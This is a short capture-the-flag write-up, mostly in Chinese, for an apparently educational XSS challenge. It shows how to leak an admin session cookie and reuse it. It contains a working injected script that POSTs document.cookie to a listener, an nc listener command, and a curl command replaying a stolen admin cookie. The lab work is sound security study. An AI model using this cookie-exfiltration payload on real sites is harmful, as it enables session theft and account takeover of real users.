@@ -1,0 +1,34 @@
+#XSS 7
+#挑战简介
+Depending on the attacker's goals, what they might actually be after is the victim's entire account. For example, 
+attackers might use XSS to exfiltrate victim authentication data and then use this data to take over the victim's account.
+
+Authentication data is often stored via browser cookies, such as what happened in Authentication Bypass 2 (but, typically, much more secure). If an attacker can leak these cookies, 
+the result can be disastrous for the victim.
+
+This level stores the authentication data for the logged in user in a cookie. You must use XSS to leak this cookie so that you can, in turn, 
+use it in a request to impersonate the admin user. This exfiltration will happen over HTTP to a server that you run, 
+and everything you need is available via JavaScript's fetch() and its ability to access (some) site cookies.
+
+HINT: By "server that you run", we really mean that listening on a port with nc will be sufficient. Look at the -l and -v options to nc.
+
+#这题思路想通了很简单，我也是在discord上逛了6小时才明白
+1.打开/challenge/server
+2.以hacker或guest的身份登录  
+3.输入脚本，获取document.cookie
+<script>fetch('http://challenge.localhost:1337/', {
+  method: 'POST',
+  body: document.cookie,
+  mode: 'no-cors'
+});</script>
+4.nc -lv your_port
+5./challenge/victim
+6.得到cookie
+7.以curl -b登录服务器
+curl -b "auth=admin|qf.dJDO1YDL0ETM2YzW}" http://challenge.localhost/
+
+#难点很多，顺序知道的很早，但是在写fetch脚本的时候遇到了很大的困难，才知道，要写 "mode: 'no-cors'",没有这个语法，nc不会返回cookies，这条语法的意思是
+no-cors — 保证请求对应的 method 只有 HEAD，GET 或 POST 方法，并且请求的 headers 只能有简单请求头 (simple headers)。如果 ServiceWorker 劫持了此类请求，除了 simple header 之外，
+不能添加或修改其他 header。另外 JavaScript 不会读取 Response 的任何属性。这样将会确保 ServiceWorker 不会影响 Web 语义 (semantics of the Web)，同时保证了在跨域时不会发生安全和隐私泄露的问题。
+
+curl -b可以直接用cookie发送HTTp请求
